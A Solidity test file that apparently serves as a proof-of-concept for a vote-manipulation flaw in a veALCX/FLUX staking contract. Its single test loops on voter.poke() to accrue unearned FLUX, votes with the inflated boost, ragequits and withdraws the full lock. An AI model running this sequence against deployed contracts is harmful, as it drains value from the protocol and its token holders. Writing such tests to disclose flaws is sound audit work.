// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.15;

import "./BaseTest.sol";

contract FluxTokenTest is BaseTest {
    function setUp() public {
        setupContracts(block.timestamp);
    }

    function testFluxVotingManipulation() external {
        address bribeAddress = voter.bribes(address(sushiGauge));

        uint256 tokenId1 = createVeAlcx(beef, TOKEN_1M, veALCX.MAXTIME(), false);
        uint256 amount1 = veALCX.claimableFlux(tokenId1);
        uint256 unclaimedFlux1Start = flux.getUnclaimedFlux(tokenId1);

        assertEq(unclaimedFlux1Start, 0, "should start with no unclaimed flux");

        address[] memory pools = new address[](1);
        pools[0] = sushiPoolAddress;
        uint256[] memory weights = new uint256[](1);
        weights[0] = 5000;

        address[] memory bribes = new address[](1);
        bribes[0] = address(bribeAddress);
        address[][] memory tokens = new address[][](2);
        tokens[0] = new address[](1);
        tokens[0][0] = bal;

        uint i = 0;
        uint unclaimedFlux;
        uint maxVotingPower;

        hevm.startPrank(beef);

        uint maxBoost = voter.maxVotingPower(tokenId1) - IVotingEscrow(veALCX).balanceOfToken(tokenId1);
        uint256 ragequitAmount = veALCX.amountToRagequit(tokenId1);

        while(unclaimedFlux < (maxBoost + ragequitAmount)) {
            voter.poke(tokenId1);
            unclaimedFlux = flux.getUnclaimedFlux(tokenId1);
        }

        flux.approve(address(veALCX), unclaimedFlux);

        hevm.warp(newEpoch());

        uint maxBoost2 = voter.maxVotingPower(tokenId1) - IVotingEscrow(veALCX).balanceOfToken(tokenId1);

        voter.vote(tokenId1, pools, weights, maxBoost2);

        flux.claimFlux(tokenId1, ragequitAmount);
        flux.approve(address(veALCX), ragequitAmount);

        veALCX.startCooldown(tokenId1);
        hevm.warp(block.timestamp + nextEpoch);
        voter.reset(tokenId1);
        veALCX.withdraw(tokenId1);

        assertEq(IERC20(bpt).balanceOf(beef), TOKEN_1M);

        hevm.stopPrank();
    }
}
